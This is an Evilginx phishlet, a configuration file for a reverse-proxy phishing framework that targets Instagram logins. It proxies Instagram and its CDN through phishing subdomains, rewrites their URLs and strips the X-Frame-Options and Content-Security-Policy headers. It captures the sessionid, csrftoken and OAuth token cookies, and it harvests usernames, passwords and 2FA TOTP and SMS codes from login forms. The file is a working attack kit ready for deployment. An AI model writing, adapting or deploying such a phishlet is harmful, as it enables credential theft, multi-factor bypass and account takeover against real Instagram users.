min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.instagram.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Instagram domain URLs
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://www\\.instagram\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'api', domain: 'instagram.com', search: 'https://api\\.instagram\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: 'https://i\\.instagram\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Replace Instagram CDN URLs
  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'https://static\\.cdninstagram\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'scontent', domain: 'cdninstagram.com', search: 'https://scontent[0-9a-z-]*\\.cdninstagram\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: 'https://[a-z0-9-]+\\.cdninstagram\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'api', domain: 'instagram.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.instagram.com', orig_sub: 'api', domain: 'instagram.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Instagram authentication cookies
  - domain: '.instagram.com'
    keys: ['sessionid', 'csrftoken', 'ds_user_id', 'mid', 'ig_did', 'ig_nrcb']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.instagram.com'
    keys: ['rur', 'shbid', 'shbts', 'dpr', 'datr']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.instagram.com'
    keys: ['access_token', 'refresh_token', 'token_type']
    type: 'cookie'
    optional: true
  
  # User preferences
  - domain: '.instagram.com'
    keys: ['ig_lang', 'ig_locale', 'ig_timezone']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email/phone field
  email:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  phone:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'verification_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/$'
  - '^/direct/inbox'
  - '^/explore'
  - '^/accounts/edit'
  - '^/accounts/activity'
  - '^/reels'

login:
  domain: 'www.instagram.com'
  path: '/accounts/login'

